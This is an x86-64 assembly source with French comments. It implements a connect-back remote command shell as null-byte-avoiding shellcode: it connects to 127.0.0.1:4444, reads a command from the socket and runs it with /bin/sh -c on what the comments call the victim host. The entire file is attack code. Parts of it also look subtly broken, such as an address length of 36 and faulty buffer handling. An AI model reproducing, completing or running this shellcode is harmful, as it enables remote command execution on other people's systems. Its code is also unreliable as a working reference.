BITS 64

SECTION .bss
	sock_buffer resb 2048

SECTION .text
global _start
_start:


; SERVEUR (victime) :
; - création et connection du socket
; - lecture de la commande à executer (sys_read du FD du socket)
; - préparation d'un execve("/bin/sh", "-c", <arguments_sup>")
; - execution de la commande préparée (par execve)
; - récupération de l'output de la commande
; - écriture de l'output de la commande dans le socket


; ----- () sys_socket -----
_socket:
        xor rbx,rbx
        xor rax,rax
        xor rcx,rcx
        xor rdx,rdx                     ; purge des registres


        push byte 2                     ; Family - AF_INET (2) pour IPv4
        pop rdi
        push byte 1                     ; type - SOCK_STREAM
        pop rsi
        xor rdx, rdx
        mov al, 41                      ; syscall socket
        syscall
        mov r15, rax

; ----- () sys_connect -----
_connect:
	xor rdi, rdi                    
        xor rsi, rsi
        xor rdi, rdi

        mov rdi, r15                    ; on récupère le old_fd

        mov rcx, 0x12111190             ; set IP to 127.0.0.1(0x12111190) + 0x11111111
        sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1

        push rcx
        push word 0x5c11                ; port 4444
        push word 2
        mov rsi, rsp                    ; struct sockaddr
        push byte 36                           
        pop rdx                         ; addrlen - 36
        xor rax, rax
        mov al, 42
        syscall

; ---- (57) sys_fork ----
_fork:
	;mov rdi, rax			; on récupère le socket
	mov al, 57			; sys_fork
	syscall
	
	cmp rax, 0			; compare if in child process
	
	jz _readexec			; jmp in child process sys_read and sys_execve
		
	jmp _connect			; jmp in parent sys_connect

; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
_readexec:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rcx, rcx

	mov rdi, r15			; rdi <- unsigned int fd
	
	push sock_buffer
	mov rsi, rsp			; rsi <- char *buf : 
					;      destination (on alloue une la taille de 2048 à la mémoire)
		
	mov rdx, 2048			; rdx <- size_t count : on lui donne la taille du buffer
	;mov rdx, 2
	
	syscall

	mov r12, [rsi]
	
; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[])-----
	xor rax, rax
	xor rdx, rdx
        xor rbx, rbx
        xor rcx, rcx
	xor rsi, rsi	
	xor r13, r13
        
	push rbx
        mov rbx, 0x68732f6e69622f2f     ; //bin/sh
        
	push rcx			; push 0
	push rbx			; push //bin/sh
        mov rdi, rsp                    ; rdi arg : const char *filename

	push rcx			; push 0 -> cleaning stack

	mov r13, 0x632d			; "-c"
	push r13			; push "-c"
	mov r14, rsp			; char * '-c'
	
	push rcx			; push 0
	
	push r12			; push fd de sys_read
	mov r12, rsp
	
	push rcx			; push 0

	push rbx			; push //bin/sh (rbx)
	mov rbx, rsp			; char * '//bin/sh'
	
	push rcx			; push 0 -> cleaning stack

	push r12			; push fd de sys_read
	push r14			; push -c
	push rbx			; push //bin/sh

	mov rsi, rsp			; get [ //bin/sh, -c, [sock_buffer] ]

        mov al, 59                      ; syscall 59 - execve
        syscall

